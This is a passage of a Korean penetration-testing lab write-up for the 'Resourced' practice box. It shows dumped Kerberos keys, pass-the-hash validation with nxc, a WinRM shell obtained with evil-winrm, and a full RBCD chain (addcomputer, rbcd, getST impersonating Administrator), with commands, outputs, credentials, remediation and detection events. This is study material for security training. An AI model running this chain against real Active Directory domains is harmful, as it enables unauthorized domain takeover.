M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up... 
```
— 출처: `파일보관/Pasted image 20260703134859.png` (스크린샷은 `RESOURCEDC$:aes256…` 행에서 잘림. 그 아래와 `Cleaning up` 은 원본 노트 기록)

![[Pasted image 20260703134859.png]]

**출력에서 반드시 읽을 것**

| 줄 | 의미 |
|---|---|
| `Target system bootKey: 0x6f96…` | `SYSTEM` 하이브에서 SysKey 추출 성공. 여기서 실패하면 하이브가 잘못된 것 |
| `PEK # 0 found and decrypted` | bootKey 로 PEK 를 깜. 이 줄이 없으면 뒤의 해시는 전부 쓰레기 |
| `RESOURCEDC$:1000:…:9ddb6f4d…` | 머신계정 NT 해시가 `$MACHINE.ACC` 와 동일 — 같은 비밀의 다른 저장소이므로 일치가 정상. 자기 검증 지점으로 쓸 것 |
| `aes256-cts-hmac-sha1-96` | Kerberos 키. RC4 가 정책으로 꺼진 도메인에서는 NT 해시가 아니라 이쪽이 열쇠임(`-aesKey`) |
| `Guest:501:…:31d6cfe0d16ae931b73c59d7e0c089c0` | 빈 비밀번호의 NT 해시. 이 값이 보이면 「비밀번호 없음」임 |

LM 자리의 `aad3b435b51404eeaad3b435b51404ee` 는 **빈 LM 해시의 고정값**임. LM 은 Vista/Server 2008 이후 기본 미저장이고 NTLMv2 계산에도 쓰이지 않음 — 그래서 impacket 의 `-hashes :<NTHASH>` 가 콜론으로 시작함(LM 자리를 빈 문자열로 둠).

**해시·사용자 파일은 `cut` 이 아니라 손으로 만들었다.** `~/.zsh_history` 1390→1391 이 `vi password.txt` → `mv password.txt hashs.txt` 임. 파일명이 오타(`hashs.txt`)인 채로 뒤의 nxc 명령에 그대로 쓰였음. 자동화 대안은 아래이나 **이 박스에서 실행되지는 않았음.**

```bash
cut -d: -f1 dump.txt > users.txt
cut -d: -f4 dump.txt > nt.txt
```

**해시 다발을 «짝지어» 검증.**

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc smb 192.168.125.175 -u users.txt -H hashs.txt --no-bruteforce --continue-on-success
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\RESOURCEDC:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:3e028552b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:bd7c11a9021d2708eda561984f3c8939 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\P.Parker:980910b8fc2e4fe9d482123301dd19fe STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:fea5a148c14cf51590456b2102b29fac STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\D.Durant:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:62e16d17c3015c47b4d513e65ca757a2 STATUS_PASSWORD_EXPIRED
```
— 출처: `파일보관/Pasted image 20260703141736.png` (스크린샷은 `J.Johnson` 행에서 잘림. 그 아래 여섯 줄은 원본 노트 기록)

![[Pasted image 20260703141736.png]]

**플래그 해설** — nxc 1.4.0 `--help` 원문 실측.

| 플래그 | `--help` 원문 | 빼면 어떻게 되는가 |
|---|---|---|
| `--no-bruteforce` | *"No spray when using file for username and password (user1 => password1, user2 => password2)"* | **빼면 14×14 = 196회 조합 시도.** 잠금 정책이 있으면 계정 전부를 잠금 — 잠긴 계정은 리버트 말고 되돌릴 방법이 없음 |
| `--continue-on-success` | *"continues authentication attempts even after successes"* | **빼면 첫 성공에서 멈춤.** `L.Livingstone` 에서 끝나 `V.Ventz` 도 유효하다는 사실을 못 봄 |

**`STATUS_PASSWORD_EXPIRED` 는 «해시가 맞다»는 증거다.** 상태 코드를 갈라 읽을 것 — `STATUS_LOGON_FAILURE` 는 자격증명이 틀린 것, `STATUS_ACCOUNT_DISABLED` 는 맞지만 계정이 비활성, `STATUS_PASSWORD_EXPIRED` 는 **NTLM 검증을 통과했는데 서버가 「비밀번호를 바꾸기 전에는 세션을 못 준다」고 거절한 것**임. 이걸 실패로 읽으면 박스가 끝남.

왜 둘만 통과했는가 — BloodHound 사용자 덤프의 `pwdneverexpires` 가 답함.

```text
NT AUTHORITY@RESOURCED.LOCAL | pwdneverexpires=null
G.GOLDBERG@RESOURCED.LOCAL | pwdneverexpires=false
R.ROBINSON@RESOURCED.LOCAL | pwdneverexpires=false
D.DURANT@RESOURCED.LOCAL | pwdneverexpires=false
P.PARKER@RESOURCED.LOCAL | pwdneverexpires=false
V.VENTZ@RESOURCED.LOCAL | pwdneverexpires=true
S.SWANSON@RESOURCED.LOCAL | pwdneverexpires=false
J.JOHNSON@RESOURCED.LOCAL | pwdneverexpires=false
L.LIVINGSTONE@RESOURCED.LOCAL | pwdneverexpires=true
K.KEEN@RESOURCED.LOCAL | pwdneverexpires=false
M.MASON@RESOURCED.LOCAL | pwdneverexpires=false
KRBTGT@RESOURCED.LOCAL | pwdneverexpires=false
GUEST@RESOURCED.LOCAL | pwdneverexpires=true
ADMINISTRATOR@RESOURCED.LOCAL | pwdneverexpires=true
```
— 출처: `~/PG/Resourced/20260703143203_users.json` 을 `jq` 로 조회(재실행 2026-08-26)

`DONT_EXPIRE_PASSWORD`(userAccountControl 비트 0x10000)가 켜진 계정은 **넷**임 — `Administrator`·`Guest`·`V.Ventz`·`L.Livingstone`. 그중 `Administrator` 는 `LOGON_FAILURE`(백업 이후 비밀번호가 바뀜), `Guest` 는 `ACCOUNT_DISABLED`. 남은 둘이 통과했음. 반대로 `false` 인 계정은 **전부** `PASSWORD_EXPIRED` — 2021-10-01 에 설정된 비밀번호가 기본 최대 사용 기간(42일)을 한참 넘겼기 때문임.

LDAP 으로 미리 좁힐 수 있음. `1.2.840.113556.1.4.803` 은 **LDAP_MATCHING_RULE_BIT_AND**(비트 AND 매칭 OID)임 — 이걸 모르면 UAC 플래그 필터를 손으로 못 씀.

```bash
ldapsearch -x -H ldap://<IP> -D '<user>@<domain>' -w '<pass>' -b '<baseDN>' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' sAMAccountName
```

**PtH → WinRM.** 해시 검증 8분 뒤 WinRM 을 때림.

```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ nxc winrm 192.168.125.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808
WINRM       192.168.125.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.125.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
WINRM       192.168.125.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 zip() argument 2 is longer than argument 1
```
— 출처: `파일보관/Pasted image 20260703142509.png`

`(Pwn3d!)` 는 **대화형 셸이 열린다**는 신호임. 그 다음 줄의 `zip() argument 2 is longer than argument 1` 은 nxc 내부 예외이지 인증 실패가 아님 — `[+] (Pwn3d!)` 가 이미 나온 뒤라 판정은 끝났음. **한 줄 아래의 `[-]` 를 보고 결과를 뒤집지 말 것.**

![[Pasted image 20260703142509.png]]

```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ evil-winrm -i 192.168.125.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> type ../desktop/local.txt
7a1b4d1533fb4d6bea00b6af60a08d15
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents>
```
— 출처: `파일보관/Pasted image 20260703142645.png`

![[Pasted image 20260703142645.png]]

**왜 이 사용자만 WinRM 이 되는가** — BloodHound 그룹 덤프가 확인해 줌.

```text
REMOTE MANAGEMENT USERS@RESOURCED.LOCAL
REMOTE DESKTOP USERS@RESOURCED.LOCAL
```
— 출처: `~/PG/Resourced/20260703143203_groups.json` 에서 RID 1105(`L.Livingstone`)를 멤버로 가진 그룹을 `jq` 로 조회(재실행 2026-08-26)

`Remote Management Users` 멤버십이 WinRM 접속의 조건임(관리자가 아니어도 됨). `Service Enumeration` 절에서 `V.Ventz` 가 WinRM 에서 `[-]` 였던 이유가 이것임.

**왜 해시만으로 인증이 되는가** — NTLMv2 응답 계산이 평문이 아니라 NT 해시에서 시작하기 때문임.

```text
NTOWFv2  = HMAC-MD5( NT해시, UTF-16LE( UPPER(사용자명) + 도메인 ) )
NTv2Resp = HMAC-MD5( NTOWFv2, 서버챌린지 ‖ blob )
```

계산의 출발점이 NT 해시 그 자체라 **NTLM 에서 NT 해시는 「비밀번호의 지문」이 아니라 「비밀번호를 대체하는 키」** 임. 그래서 `evil-winrm -H`·`nxc -H`·`impacket -hashes :NTHASH` 가 전부 동작하고 크랙이 불필요함. 뒤집으면 **NT 해시 유출은 비밀번호 유출과 동등**함.

**SMB 서명이 막는 것은 PtH 가 아니라 릴레이다.** `Service Enumeration` 의 `Message signing enabled and required` 는 우리가 해시로 인증하는 것을 전혀 막지 못했음(위 출력이 증명). 서명이 막는 것은 제3자가 `AUTHENTICATE_MESSAGE` 를 가로채 다른 서버에 되던지는 것임. 둘을 혼동하지 말 것.

evil-winrm 은 완전한 대화형 PowerShell 세션이라 OSCP 증거로 인정됨. 웹셸에서 `type` 으로 읽은 플래그는 0점임 — 규정 원문 *"this includes any type of web-based shell"*([[Butch]]).

**Local.txt value:**
`7a1b4d1533fb4d6bea00b6af60a08d15`

시험 형식으로는 한 화면에 담을 것 — `whoami; hostname; ipconfig; type C:\Users\L.Livingstone\Desktop\local.txt`. 이 박스에서는 그 형식으로 찍은 기록이 없음(관측 없음) — 남은 것은 위 evil-winrm 세션 캡처임.

### Privilege Escalation – RBCD (컴퓨터 객체의 GenericAll → S4U2Self/S4U2Proxy)

**Vulnerability Explanation:** 일반 사용자 `L.Livingstone`(RID 1105)이 **DC 컴퓨터 객체 `RESOURCEDC$` 에 대해 `GenericAll`** 을 가짐. `inherited=false` 라 상속이 아니라 손으로 붙인 오설정임.
- 컴퓨터 객체의 `GenericAll` 은 모든 속성 쓰기를 뜻하므로 `msDS-AllowedToActOnBehalfOfOtherIdentity` 를 써넣을 수 있음 = **Resource-Based Constrained Delegation(RBCD)** 설정 권한
- 도메인의 `ms-DS-MachineAccountQuota` 가 0 이 아니라 공격자가 자기 머신계정을 새로 만들 수 있음. 그 계정을 위임 주체로 등록하면 DC 에 대해 임의 사용자를 사칭 가능
- Kerberos S4U2Self + S4U2Proxy 로 `Administrator` 명의의 `cifs/` 서비스 티켓을 발급받아 psexec = SYSTEM

**Vulnerability Fix:**
- DC 컴퓨터 객체의 DACL 에서 `L.Livingstone` 의 `GenericAll` ACE 제거. **DC 컴퓨터 객체는 Domain Admins·Enterprise Admins·SYSTEM 외에 쓰기 주체가 있어서는 안 됨**
- `ms-DS-MachineAccountQuota` 를 **0** 으로 설정. RBCD·Shadow Credentials·noPac 계열의 공통 전제조건을 제거함
- 이벤트 **4741**(컴퓨터 계정 생성)·**4742**(`msDS-AllowedToActOnBehalfOfOtherIdentity` 변경)·**4769**(S4U 패턴의 서비스 티켓 요청) 감시

**Severity:** Critical — 일반 사용자 자격증명 하나에서 DC SYSTEM 까지 명령 세 개로 도달

**Steps to reproduce the attack:**
1. `bloodhound-python -c all` 로 수집 → `L.Livingstone --GenericAll--> RESOURCEDC$` 확인
2. `sudo rdate -n <DC>` 로 시계 동기, `/etc/hosts` 에 FQDN 등록
3. `impacket-addcomputer` 로 머신계정 `4Leaf$` 생성
4. `impacket-rbcd -delegate-from '4Leaf$' -delegate-to 'RESOURCEDC$' -action write`
5. `impacket-getST -spn 'cifs/<FQDN>' -impersonate Administrator` 로 서비스 티켓 발급
6. `KRB5CCNAME` 을 절대 경로로 export 후 `impacket-psexec -k -no-pass <FQDN>` → SYSTEM

**BloodHound 수집.**

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns 192.168.125.175 -c all --dns-timeout 30
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: resourced.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (resourcedc.resourced.local:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Done in 00M 13S
```
— 출처: 원본 노트 기록. 산출물은 `~/PG/Resourced/20260703143203_{computers,containers,domains,gpos,groups,ous,users}.json` 7개로 남아 있고 이 노트의 ACE·그룹·UAC 판정은 전부 그 JSON 직접 조회 결과임

`Failed to get Kerberos TGT ... Connection refused` 는 실패가 아님 — 경고가 뜨고도 수집이 정상 완료됨(`Done in 00M 13S`). bloodhound-python 은 Kerberos 를 먼저 시도하고 실패하면 NTLM 으로 폴백함. `Connection refused`(errno 111)는 이름은 풀렸는데 그 주소의 88번이 연결을 거부했다는 뜻임 — **`-ns` 가 준 DNS 가 `resourcedc.resourced.local` 을 의도한 곳이 아닌 주소로 풀었을 가능성이 큼. [가정]** 패킷을 뜨지 않아 확정할 수 없음. 데이터가 나왔으면 이 경고는 무시해도 되나, **뒤에서 진짜 Kerberos 를 쓸 때는 같은 이름 해석 문제가 치명적이 됨.**

![[Pasted image 20260706091608.png]]

**컴퓨터 객체의 ACE 전량.**

```text
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-537427935-490066102-1511301751-512 Group Owns inherited=false
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-537427935-490066102-1511301751-512 Group GenericAll inherited=false
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-537427935-490066102-1511301751-1105 User GenericAll inherited=false
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-537427935-490066102-1511301751-526 Group AddKeyCredentialLink inherited=true
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-537427935-490066102-1511301751-527 Group AddKeyCredentialLink inherited=true
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-537427935-490066102-1511301751-519 Group GenericAll inherited=true
RESOURCEDC.RESOURCED.LOCAL <= RESOURCED.LOCAL-S-1-5-32-544 Group GenericWrite inherited=true
RESOURCEDC.RESOURCED.LOCAL <= RESOURCED.LOCAL-S-1-5-32-544 Group WriteOwner inherited=true
RESOURCEDC.RESOURCED.LOCAL <= RESOURCED.LOCAL-S-1-5-32-544 Group WriteDacl inherited=true
```
— 출처: `~/PG/Resourced/20260703143203_computers.json` 을 `jq` 로 조회(재실행 2026-08-26)

RID 512 = Domain Admins · 519 = Enterprise Admins · 526/527 = Key Admins/Enterprise Key Admins · S-1-5-32-544 = Builtin\Administrators. **오설정은 `User` 타입 ACE 하나뿐임** — RID 1105 = `L.Livingstone`, 그리고 그것만 `inherited=false` 임.

`GenericAll`·`GenericWrite`·`WriteDacl`·`WriteOwner` 넷은 사실상 같은 것임 — `WriteOwner` → `WriteDacl` → `GenericAll` → `GenericWrite` 로 한 방향 승격이 되므로 넷 중 하나만 보여도 컴퓨터 객체는 이미 우리 것임. BloodHound 가 별개 엣지로 그리는 것은 몇 단계를 더 밟아야 하는지를 보여주기 위함이지 막혔다는 뜻이 아님.

`AddKeyCredentialLink`(Shadow Credentials)는 두 그룹에 상속으로 걸려 있으나 쓸 수 없었음 — ⑴ `L.Livingstone` 이 그 그룹 멤버가 아니고 ⑵ 이 도메인에 ADCS 가 없어 PKINIT 경로 자체가 성립하지 않음. **BloodHound 에 엣지가 보인다고 «내가» 쓸 수 있는 것이 아님. 엣지의 주체가 내가 통제하는 계정인지 반드시 확인할 것.**

**컴퓨터 객체와 사용자 객체는 무기화가 다르다.**

| 대상 | `GenericAll` 로 할 수 있는 것 |
|---|---|
| 사용자 객체 | 비밀번호 강제 리셋(`net rpc password`·`bloodyAD set password`) · Shadow Credentials · SPN 을 심어 Targeted Kerberoast |
| 그룹 객체 | 자신을 멤버로 추가(`net rpc group addmem`) |
| 컴퓨터 객체 | `msDS-AllowedToActOnBehalfOfOtherIdentity` 쓰기 ⇒ **RBCD** · `msDS-KeyCredentialLink` 쓰기 ⇒ Shadow Credentials |

컴퓨터 객체의 비밀번호를 리셋할 수도 있으나 **DC 머신계정 비밀번호를 바꾸면 도메인이 깨짐.** 실전에서도 시험에서도 금지임. 그래서 컴퓨터 객체에서는 위임 속성을 건드리는 쪽이 정석임. 사용자 객체의 비밀번호 리셋도 되돌릴 수 없으므로 가능하면 리셋이 아닌 경로를 먼저 찾을 것.

**RBCD 의 메커니즘.** 「누가 나에게 위임할 수 있는가를 자원 쪽이 정한다」는 모델(Windows Server 2012+)이고, 그 결정이 자원 객체의 속성 `msDS-AllowedToActOnBehalfOfOtherIdentity`(값은 보안 서술자)에 담김. 거기 적힌 주체는 자원에 대해 아무 사용자나 사칭해 접근할 수 있음.

| 단계 | 확장 | 무슨 일이 일어나는가 |
|---|---|---|
| ① | S4U2Self | `4Leaf$` 가 KDC 에 「Administrator 가 나에게 접근하는 것처럼 된 서비스 티켓을 달라」고 요청. 비밀번호 없이 Administrator 이름이 박힌 티켓을 얻음. 다만 `4Leaf$` 자신에게만 유효 |
| ② | S4U2Proxy | ①의 티켓을 증거로 붙여 「이 사용자를 대신해 `cifs/resourcedc.resourced.local` 티켓을 달라」고 요청. KDC 는 `RESOURCEDC$` 의 위임 속성에 `4Leaf$` 가 있는지 확인하고 발급 |

⚠️ **①의 티켓이 forwardable 이어야 ②가 성립함.** `Protected Users` 멤버나 `Account is sensitive and cannot be delegated`(UAC 0x100000)가 켜진 계정은 사칭할 수 없음 — S4U2Self 가 non-forwardable 티켓을 주기 때문. 시험에서 Administrator 사칭이 실패하면 가장 먼저 이걸 의심하고 사칭 대상을 다른 도메인 관리자로 바꿀 것. 이 박스의 Administrator 는 보호돼 있지 않았음(발급된 티켓 플래그에 `forwardable` 이 찍혀 있음).

**전제조건 `MachineAccountQuota`.** AD 스키마 기본값은 10 — 인증된 사용자면 누구나 머신계정을 10개까지 만들 수 있음. **[가정]** 이 박스의 실제 MAQ 값은 확인하지 못했음. BloodHound LEGACY 의 `domains.json` 은 `machineaccountquota` 를 수집하지 않음(속성 키는 `description`·`distinguishedname`·`domain`·`domainsid`·`functionallevel`·`highvalue`·`name`·`whencreated` 뿐 — 재실행으로 확인). 다만 비관리자 `L.Livingstone` 으로 `addcomputer` 가 성공했다는 사실 자체가 MAQ > 0 의 운영상 증거임. 미리 확인하려면 `nxc ldap <IP> -u .. -p .. -M maq`.

MAQ 가 0 이면 RBCD 가 막힘. 그때의 대안은 ⑴ 이미 아는 머신계정 자격증명을 `-delegate-from` 으로 쓰기(이 박스는 `$MACHINE.ACC` 해시 `9ddb6f4d9d01fedeb4bccfb09df1b39d` 를 이미 갖고 있었음) ⑵ Shadow Credentials(ADCS 필요) ⑶ 다른 경로.

> [!danger] 이 시점에 타겟 IP 가 192.168.125.175 → 192.168.120.175 로 바뀌었다
> 세션이 07-03 에서 07-06 으로 넘어가며 재배정됨. 아래 명령들의 IP 가 앞 절과 다른 것은 **오타가 아님.** `~/.zsh_history` 1466행부터 120.175 로 바뀌고, 1500→1501 에는 습관대로 옛 IP 로 친 `evil-winrm -i 192.168.125.175` 바로 다음 줄에 신 IP 재시도가 남아 있음 — **SYSTEM 을 이미 잡은 뒤에도 손이 옛 IP 를 쳤다는 기록**임.
> **PG·시험에서 박스를 리버트하면 IP 가 바뀐다.** 노트·`/etc/hosts`·스크립트에 박아 둔 IP 를 전부 갱신할 것.

시계부터 맞추고 들어감(`~/.zsh_history` 1469행 — `sudo rdate -n 192.168.120.175`). Kerberos 사전인증은 클라이언트가 현재 시각을 자기 키로 암호화해 보내고 KDC 가 자기 시계와 비교하는 방식이라, 차이가 허용치(기본 5분)를 넘으면 `KRB5KRB_AP_ERR_SKEW` 로 거부됨. **이 박스에서 그 에러가 실제로 났다는 기록은 없음** — 먼저 맞추고 들어갔기 때문임.

**① 머신계정 생성**

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer -computer-name '4Leaf$' -computer-pass 'a123a123!@' \
  -dc-ip 192.168.120.175 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account 4Leaf$ with password a123a123!@.
```
— 출처: `파일보관/Pasted image 20260706104812.png`

![[Pasted image 20260706104812.png]]

`-computer-name '4Leaf$'` — **`$` 를 붙이고 작은따옴표로 감쌀 것.** 머신계정의 `sAMAccountName` 은 관례상 `$` 로 끝나고, 큰따옴표를 쓰면 셸이 `$'` 를 변수로 해석해 이름이 깨짐. `-dc-ip` 가 없으면 도메인 FQDN 을 DNS 로 풀려다 실패함. 기본 `-method` 는 SAMR 이고 `--help` 원문이 *"SAMR works over SMB. LDAPS has some certificate requirements and isn't always available."* — **LDAPS 인증서가 없는 랩에서는 SAMR 이 정답**임.

**② RBCD 속성 쓰기**

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-rbcd -delegate-from '4Leaf$' -delegate-to 'RESOURCEDC$' -action write \
  -dc-ip 192.168.120.175 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] 4Leaf$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     4Leaf$        (S-1-5-21-537427935-490066102-1511301751-4101)
```
— 출처: `파일보관/Pasted image 20260706104945.png`

![[Pasted image 20260706104945.png]]

첫 줄 `Attribute … is empty` 가 **쓰기 전 기존 값이 없었다**는 확인임 — 값이 있었다면 덮어쓰기가 정상 위임을 깨뜨릴 수 있음. 그래서 `-action read` 로 먼저 보고, 끝나면 `-action remove`(내가 추가한 항목만) 또는 `flush`(속성 전체 비우기)로 치우는 것이 습관임(`--help` 실측 — `-action [{read,write,remove,flush}]`). 만들어진 `4Leaf$` 의 RID 는 **4101** 임.

**③ S4U — Administrator 사칭 티켓 발급**

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator \
  -dc-ip 192.168.120.175 'resourced.local/4Leaf$:a123a123!@'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```
— 출처: `파일보관/Pasted image 20260706105049.png`

![[Pasted image 20260706105049.png]]

인증 주체는 **`L.Livingstone` 이 아니라 `4Leaf$`** 임 — 위임 권한을 가진 주체가 그쪽이기 때문. `-spn` 은 목적에 맞춰 고름: `cifs/`(psexec·smbclient·smbexec) · `http/`(WinRM) · `ldap/`(DCSync) · `host/`(다목적). **티켓은 SPN 단위**라 `cifs/` 만 있으면 `secretsdump -k` 로 DCSync 를 할 수 없음.

`[*] Getting TGT for user` — getST 는 내부적으로 `4Leaf$` 명의의 TGT 를 **실제로 받음.** 다만 ccache 에 저장되는 것은 마지막 S4U2Proxy 결과인 서비스 티켓 하나뿐임. 파일명 규칙은 `<사칭대상>@<SPN 을 _ 로 치환>@<REALM>.ccache` 이고 **현재 디렉터리에** 떨어짐.

**발급된 티켓의 실체 — 파일이 지금도 남아 있다.**

```text
Ticket cache: FILE:/home/kali/PG/Resourced/Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
Default principal: Administrator@resourced.local

Valid starting       Expires              Service principal
07/06/2026 10:50:38  07/06/2026 20:50:38  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
	renew until 07/07/2026 10:50:38
```
— 출처: `ssh kali@10.44.44.128 "export KRB5CCNAME=~/PG/Resourced/Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache && klist -c \"$KRB5CCNAME\""` 재실행(2026-08-26)

```text
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 39be433e1df3909eb45ba4477b7d0ae8
[*] User Name                     : Administrator
[*] User Realm                    : resourced.local
[*] Service Name                  : cifs/resourcedc.resourced.local
[*] Service Realm                 : RESOURCED.LOCAL
[*] Start Time                    : 06/07/2026 10:50:38 AM
[*] End Time                      : 06/07/2026 20:50:38 PM (expired)
[*] RenewTill                     : 07/07/2026 10:50:38 AM (expired)
[*] Flags                         : (0x40a50000) forwardable, renewable, pre_authent, ok_as_delegate, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : cifs/resourcedc.resourced.local
[*]   Service Realm               : RESOURCED.LOCAL
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
